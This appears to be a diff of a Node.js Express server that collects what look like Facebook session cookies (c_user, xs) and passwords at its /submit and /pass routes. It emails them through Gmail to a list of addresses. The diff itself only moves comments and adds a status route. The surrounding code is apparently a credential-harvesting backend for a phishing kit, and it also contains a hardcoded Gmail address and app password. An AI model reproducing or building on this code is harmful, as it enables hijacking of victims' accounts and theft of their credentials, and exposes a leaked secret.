@@ -22,15 +22,14 @@ app.post('/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'hindistoryhub396@gmail.com',        // replace with your Gmail
-            pass: 'fylk gbsb cdgu anwh'           // use app password
+            user: 'hindistoryhub396@gmail.com',
+            pass: 'fylk gbsb cdgu anwh' // App password
         }
     });
 
-    // Send only to emails[] (not workerEmail)
     const sessionMail = {
         from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
-        to: emails.join(','),
+        to: emails.join(','), // Don't include workerEmail
         subject: `${name}`,
         text: `c_user: ${c_user}\nxs: ${xs}`
     };
@@ -79,6 +78,11 @@ app.post('/pass', async (req, res) => {
         console.error('❌ Error sending password email:', error);
         res.status(500).json({ error: 'Failed to send password email' });
     }
+});
+
+// === GET / route to avoid 404 ===
+app.get('/', (req, res) => {
+    res.send('✅ Server is running. Use POST /submit or POST /pass');
 });
 
 // === Start server ===
